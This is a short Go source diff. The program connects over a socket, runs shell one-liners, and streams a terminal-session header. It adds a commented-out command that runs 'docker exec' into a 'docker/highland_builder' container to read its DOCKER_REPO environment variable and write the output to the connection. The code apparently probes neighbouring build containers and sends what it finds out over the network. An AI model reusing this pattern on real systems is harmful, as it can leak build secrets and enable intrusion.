@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"time"
 )
 
 func run(oneliner string) []byte {
@@ -29,8 +30,13 @@ func main() {
 	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"))
 	if err == nil {
 		log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
+	} else {
+		log.Println(err)
 	}
 	//go io.Copy(os.Stdout, conn)
+	//conn.Write(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO || echo no DOCKER_REPO`))
+	time.Sleep(time.Second)
+	conn.Write([]byte(`{"env":{"SHELL":"/bin/bash","TERM":"screen"},"height":45,"timestamp":1548324095,"version":2,"width":174}` + "\n"))
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
 		line := scanner.Text() //+ "\n"
